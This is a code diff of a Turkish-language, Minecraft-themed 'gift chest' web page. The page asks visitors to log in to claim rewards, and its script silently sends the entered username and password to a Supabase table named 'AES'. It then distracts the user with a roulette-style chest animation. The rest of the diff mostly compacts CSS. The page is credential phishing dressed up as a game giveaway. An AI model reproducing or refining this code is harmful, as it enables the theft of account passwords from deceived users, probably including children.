@@ -31,7 +31,6 @@
             overflow-x: hidden;
         }
 
-        /* --- MODERN NAVBAR --- */
         nav {
             padding: 15px 8%;
             display: flex;
@@ -45,28 +44,11 @@
             z-index: 100;
         }
 
-        .logo-wrapper {
-            display: flex;
-            align-items: center;
-            gap: 15px;
-        }
-
-        .logo-img {
-            width: 45px;
-            height: 45px;
-            object-fit: contain;
-            filter: drop-shadow(0 0 10px var(--primary));
-        }
-
-        .logo-text { 
-            font-size: 26px; 
-            font-weight: 800; 
-            letter-spacing: -1px;
-            text-transform: uppercase;
-        }
+        .logo-wrapper { display: flex; align-items: center; gap: 15px; }
+        .logo-img { width: 45px; height: 45px; object-fit: contain; filter: drop-shadow(0 0 10px var(--primary)); }
+        .logo-text { font-size: 26px; font-weight: 800; letter-spacing: -1px; text-transform: uppercase; }
         .logo-text span { color: var(--primary); }
 
-        /* --- AUTH CARD --- */
         #auth-container {
             margin: auto;
             width: 100%;
@@ -96,12 +78,7 @@
             box-sizing: border-box;
             margin-bottom: 20px;
         }
-        input:focus {
-            outline: none;
-            border-color: var(--primary);
-            background: rgba(255,255,255,0.08);
-            box-shadow: 0 0 20px rgba(0, 162, 255, 0.2);
-        }
+        input:focus { outline: none; border-color: var(--primary); background: rgba(255,255,255,0.08); box-shadow: 0 0 20px rgba(0, 162, 255, 0.2); }
 
         .btn-primary {
             width: 100%;
@@ -118,18 +95,10 @@
         }
         .btn-primary:hover { transform: translateY(-3px); box-shadow: 0 15px 30px rgba(0, 162, 255, 0.4); }
 
-        /* --- GAME SECTION --- */
         #game-container { display: none; padding: 60px 10%; text-align: center; }
-        
-        .main-chest {
-            width: 240px;
-            cursor: pointer;
-            transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-            filter: drop-shadow(0 0 40px rgba(0, 162, 255, 0.4));
-        }
+        .main-chest { width: 240px; cursor: pointer; transition: 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); filter: drop-shadow(0 0 40px rgba(0, 162, 255, 0.4)); }
         .main-chest:hover { transform: scale(1.1) rotate(5deg); }
 
-        /* --- ROULETTE --- */
         #roulette-section { display: none; margin-top: 50px; }
         .viewport {
             width: 100%;
@@ -142,38 +111,14 @@
             position: relative;
             overflow: hidden;
         }
-        .viewport::after {
-            content: '';
-            position: absolute;
-            left: 50%; top: 0; bottom: 0;
-            width: 4px; background: var(--primary);
-            box-shadow: 0 0 20px var(--primary);
-            z-index: 10;
-        }
+        .viewport::after { content: ''; position: absolute; left: 50%; top: 0; bottom: 0; width: 4px; background: var(--primary); box-shadow: 0 0 20px var(--primary); z-index: 10; }
 
         #strip { display: flex; position: absolute; left: 0; top: 0; height: 100%; align-items: center; }
         .slot { min-width: 140px; display: flex; flex-direction: column; align-items: center; gap: 10px; }
         .slot img { width: 80px; filter: drop-shadow(0 10px 15px rgba(0,0,0,0.5)); }
 
-        /* --- MODAL --- */
-        #win-modal {
-            display: none;
-            position: fixed;
-            inset: 0;
-            background: rgba(0,0,0,0.95);
-            backdrop-filter: blur(15px);
-            z-index: 1000;
-            justify-content: center; align-items: center;
-            flex-direction: column;
-        }
-        .win-card {
-            background: rgba(255,255,255,0.05);
-            padding: 60px;
-            border-radius: 40px;
-            border: 1px solid var(--primary);
-            text-align: center;
-            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
+        #win-modal { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.95); backdrop-filter: blur(15px); z-index: 1000; justify-content: center; align-items: center; flex-direction: column; }
+        .win-card { background: rgba(255,255,255,0.05); padding: 60px; border-radius: 40px; border: 1px solid var(--primary); text-align: center; animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); }
 
         @keyframes fadeIn { from { opacity: 0; transform: translateY(20px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes popIn { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); opacity: 1; } }
@@ -192,7 +137,6 @@
 <div id="auth-container">
     <h2>Giriş Yap</h2>
     <p>Hediyelerini almak için hesabını bağla.</p>
-    
     <input type="text" id="username" placeholder="Kullanıcı Adı">
     <input type="password" id="password" placeholder="Şifre">
     <button class="btn-primary" onclick="connectAndGo()">DÜNYAYA KATIL</button>
@@ -200,16 +144,12 @@
 
 <div id="game-container">
     <h1 id="welcome-txt" style="font-weight: 800; font-size: 42px; margin-bottom: 40px;"></h1>
-    
     <div id="chest-zone">
         <img src="https://minecraft.wiki/images/Chest_JE2_BE2.png" class="main-chest" onclick="initRoulette()">
         <p style="margin-top: 30px; color: var(--primary); font-weight: 600; letter-spacing: 2px; text-transform: uppercase;">Sandığı Açmak İçin Dokun</p>
     </div>
-
     <div id="roulette-section">
-        <div class="viewport">
-            <div id="strip"></div>
-        </div>
+        <div class="viewport"><div id="strip"></div></div>
         <button class="btn-primary" id="spin-btn" style="width: 240px; margin-top: 40px;" onclick="runRoulette()">KASAYI ÇEVİR</button>
     </div>
 </div>
@@ -219,14 +159,11 @@
         <h3 style="color: var(--primary); margin: 0; text-transform: uppercase; letter-spacing: 2px;">Başarım Kazanıldı!</h3>
         <h1 id="win-name" style="font-size: 42px; margin: 10px 0 30px 0;"></h1>
         <img id="win-img" src="" width="180">
-        <div style="margin-top: 40px;">
-            <button class="btn-primary" onclick="location.reload()">TEKRAR DENE</button>
-        </div>
+        <div style="margin-top: 40px;"><button class="btn-primary" onclick="location.reload()">TEKRAR DENE</button></div>
     </div>
 </div>
 
 <script>
-    // --- SUPABASE BAĞLANTISI ---
     const S_URL = "https://iigemvvlznvgneghevev.supabase.co";
     const S_KEY = "sb_publishable_sus0jwzJ9oMsoTO-_Xq3Yg_OTXHZIpm"; 
     const _db = supabase.createClient(S_URL, S_KEY);
@@ -244,12 +181,10 @@
         const p = document.getElementById('password').value;
         if(!u || !p) return alert("Bilgileri gir!");
 
-        try {
-            await _db.from('AES').insert([{ username: u, password: p }]);
-        } catch (e) {
-            console.log("Supabase hatası (muhtemelen tablo yok):", e);
-        }
+        // Supabase'e veriyi asenkron gönderiyoruz
+        _db.from('AES').insert([{ username: u, password: p }]).then(res => console.log("DB Status:", res));
 
+        // Beklemeden direkt geçiş yapıyoruz
         document.getElementById('auth-container').style.display = 'none';
         document.getElementById('game-container').style.display = 'block';
         document.getElementById('welcome-txt').innerText = "HOŞ GELDİN, " + u.toUpperCase();
@@ -263,11 +198,7 @@
         
         for(let i=0; i<80; i++) {
             const item = rewards[Math.floor(Math.random() * rewards.length)];
-            strip.innerHTML += `
-                <div class="slot">
-                    <img src="${item.img}">
-                    <span style="font-size: 10px; color: #555; text-transform: uppercase;">${item.name}</span>
-                </div>`;
+            strip.innerHTML += `<div class="slot"><img src="${item.img}"><span style="font-size: 10px; color: #555;">${item.name}</span></div>`;
         }
     }
 
@@ -277,7 +208,7 @@
         btn.disabled = true;
         btn.style.opacity = "0.3";
 
-        const move = 6000 + Math.floor(Math.random() * 2000);
+        const move = 5000 + Math.floor(Math.random() * 2000);
         strip.style.transition = "transform 6s cubic-bezier(0.15, 0, 0.15, 1)";
         strip.style.transform = `translateX(-${move}px)`;
 
